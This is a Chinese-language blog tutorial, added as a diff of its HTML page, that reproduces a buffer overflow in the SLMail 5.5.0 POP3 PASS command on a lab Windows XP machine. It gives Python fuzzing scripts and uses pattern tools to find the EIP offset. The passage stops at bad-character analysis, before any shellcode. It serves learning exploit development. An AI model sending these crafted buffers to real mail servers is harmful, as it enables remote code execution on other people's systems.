@@ -1,0 +1,1380 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全,fuzzy,缓冲区溢出," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demos's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。  程序的漏洞从哪里来： 罪恶的根源：变量 数据与代码边界不清（程序没有严格的限定） 由于控制不严会造成程序被严重的破坏 最简单漏洞原理——shell脚本   通过一个最简单的shell脚本来体现漏洞的由来：  这个脚本本意是将用户输入的字符显示出来，从">
+<meta name="keywords" content="安全,fuzzy,缓冲区溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次windows缓冲区溢出复现">
+<meta property="og:url" content="https://www.lsowl.xyz/2018/06/09/缓冲区溢出/index.html">
+<meta property="og:site_name" content="Demos&#39;s Blog">
+<meta property="og:description" content="缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。  程序的漏洞从哪里来： 罪恶的根源：变量 数据与代码边界不清（程序没有严格的限定） 由于控制不严会造成程序被严重的破坏 最简单漏洞原理——shell脚本   通过一个最简单的shell脚本来体现漏洞的由来：  这个脚本本意是将用户输入的字符显示出来，从">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-20/39703071.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/49054008.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/51147695.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/87550059.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/83362379.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/89254562.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65934922.jpg">
+<meta property="og:image" content="c:/Users/ADMINI~1/AppData/Local/Temp/1521642331693.png">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/79008411.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21611430.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/28063784.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/73683041.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21013466.jpg">
+<meta property="og:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-23/7906793.jpg">
+<meta property="og:updated_time" content="2018-06-14T14:50:30.217Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一次windows缓冲区溢出复现">
+<meta name="twitter:description" content="缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。  程序的漏洞从哪里来： 罪恶的根源：变量 数据与代码边界不清（程序没有严格的限定） 由于控制不严会造成程序被严重的破坏 最简单漏洞原理——shell脚本   通过一个最简单的shell脚本来体现漏洞的由来：  这个脚本本意是将用户输入的字符显示出来，从">
+<meta name="twitter:image" content="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-20/39703071.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.lsowl.xyz/2018/06/09/缓冲区溢出/"/>
+
+
+
+
+
+  <title>一次windows缓冲区溢出复现 | Demos's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demos's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">It's A Long Road</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.xyz/2018/06/09/缓冲区溢出/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demos's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一次windows缓冲区溢出复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-09T20:39:50+08:00">
+                2018-06-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuzzy/" itemprop="url" rel="index">
+                    <span itemprop="name">fuzzy</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。</p>
+</blockquote>
+<h2 id="程序的漏洞从哪里来："><a href="#程序的漏洞从哪里来：" class="headerlink" title="程序的漏洞从哪里来："></a>程序的漏洞从哪里来：</h2><ul>
+<li>罪恶的根源：变量</li>
+<li>数据与代码边界不清（程序没有严格的限定）</li>
+<li>由于控制不严会造成程序被严重的破坏</li>
+<li>最简单漏洞原理——shell脚本</li>
+</ul>
+<ol>
+<li><p>通过一个最简单的shell脚本来体现漏洞的由来：</p>
+<ul>
+<li><p>这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||）</p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-20/39703071.jpg" alt=""></p>
+</li>
+<li><p>上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器</p>
+</li>
+</ul>
+</li>
+<li><p>缓冲区溢出：</p>
+<ul>
+<li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。</li>
+<li>成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。</li>
+</ul>
+</li>
+</ol>
+<h2 id="如何发现漏洞："><a href="#如何发现漏洞：" class="headerlink" title="如何发现漏洞："></a>如何发现漏洞：</h2><ul>
+<li>源码审计（首先你得能接触到源码）</li>
+<li>逆向工程</li>
+<li>模糊测试<ul>
+<li>向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出  （完全随机的不好判断）</li>
+<li>数据生成器：生成随机、半随机的数据  （工具）</li>
+<li>测试工具：识别溢出漏洞                        （工具，主要使用一些动态调试工具）</li>
+</ul>
+</li>
+</ul>
+<h2 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h2><ul>
+<li>FUZZER<ul>
+<li>SLMail 5.5.0 Mail Server      （一个Windows下的存在缓冲区溢出的服务端）</li>
+<li>ImmunityDebugger_1_85setup.exe    （一个调试工具，比OD的自动化程度高一些）</li>
+<li>mona.py                                              （辅助脚本）</li>
+<li>环境：Windows XP（需要将SLMail 、调试工具部署好）<ul>
+<li>安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放</li>
+<li>安装调试工具，如果没有Python2.7环境它会自动安装</li>
+<li>将mono.py放在ImmunityDebugger的Pycommands文件夹中</li>
+</ul>
+</li>
+<li>SLMail 5.5.0 Mail Server<ul>
+<li>pop3  pass命令存在缓冲区溢出漏洞</li>
+<li>无需身份验证实现远程代码执行</li>
+<li>DEP：阻止代码从数据页被执行      （Windows的一种安全防护机制）</li>
+<li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>pop3</p>
+<ul>
+<li><p>最简单的 <figure class="highlight"><figcaption><span>110端口```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">- 了解未知协议</span><br><span class="line">  - wireshark</span><br><span class="line"></span><br><span class="line">  - RFC</span><br><span class="line"></span><br><span class="line">  - 通过一个简单的Python脚本进行110端口的连接：</span><br><span class="line"></span><br><span class="line">    ```pytho<span class="symbol">n</span></span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket<span class="comment">(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">    try:</span><br><span class="line">        print "\nSending evil buffer..."</span><br><span class="line">        s.connect(('192.168.111.137',110))</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('USER admin' + '\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('PASS admin\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.close<span class="comment">()</span></span><br><span class="line">        print "\nDone!"</span><br><span class="line">    except:</span><br><span class="line">        print "Could not connect to POP3!"</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试</p>
+<ul>
+<li><p>测试pass命令接收到大量数据时是否合法</p>
+</li>
+<li><p>EIP寄存器存放下一条指令的地址</p>
+</li>
+<li><p>2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">buffer = [<span class="string">"A"</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span>*counter)</span><br><span class="line">    counter = counter + <span class="number">200</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes "</span> % len(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">"USER test"</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + string + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#向目标的110端口发送大量的A</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>首先确保开启了pop3：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/49054008.jpg" alt=""></p>
+</li>
+<li><p>打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/51147695.jpg" alt=""><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/87550059.jpg" alt=""></p>
+</li>
+<li><p>准备就绪以后启动脚本发送数据：</p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/83362379.jpg" alt=""></p>
+</li>
+<li><p>当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在：</p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/89254562.jpg" alt=""></p>
+</li>
+<li><p>溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。</p>
+</li>
+</ul>
+</li>
+<li><p>通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出</p>
+<ul>
+<li><p>通过第三个脚本精确的找到溢出的四个字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2700</span>     <span class="comment">#因为前面是从2700开始溢出的</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2600</span>     <span class="comment">#改为2800确定是否在 2800-2900之间</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700：</p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65934922.jpg" alt=""></p>
+</li>
+<li><p>更加精确定位</p>
+<ul>
+<li><p>二分法</p>
+</li>
+<li><p>唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP</p>
+<ul>
+<li><p>通过一个脚本生成</p>
+<figure class="highlight plain"><figcaption><span>/usr/share/metasploit-framework/tools/exploit/```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)</span><br><span class="line"></span><br><span class="line">- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)</span><br><span class="line"></span><br><span class="line">- EIP中的四个字节的HEX为：39 69 44 38  由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9</span><br><span class="line"></span><br><span class="line">- 使用脚本查看着四个字节的偏移量：</span><br><span class="line"></span><br><span class="line">  ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)</span><br><span class="line"></span><br><span class="line">- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80</span><br><span class="line">  try:</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521642331693.png" alt="52164233169"></p>
+</li>
+<li><p>通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行</p>
+<ul>
+<li><p>寻找可存放shellcode的内存空间</p>
+</li>
+<li><p>通过脚本来探测ESP寄存器的大小：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * <span class="number">890</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span>![](http://demos-qq.oss-cn-beijing.aliyuncs.com/<span class="number">18</span><span class="number">-3</span><span class="number">-22</span>/<span class="number">9248235.j</span>pg)</span><br></pre></td></tr></table></figure>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg" alt=""></p>
+</li>
+<li><p>然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode）<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/79008411.jpg" alt=""></p>
+</li>
+<li><p>由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途</p>
+<ul>
+<li><p>返回地址、shellcode、buffer都不能出现坏字符</p>
+</li>
+<li><p>null byte (0x00) 空字符、用于终止字符串的拷贝操作</p>
+</li>
+<li><p>return （0x0D）回车操作，表示POP3 PASS命令输入完成</p>
+</li>
+<li><p>思路：发送0x00——0xff 256个字符，查找所有坏字符</p>
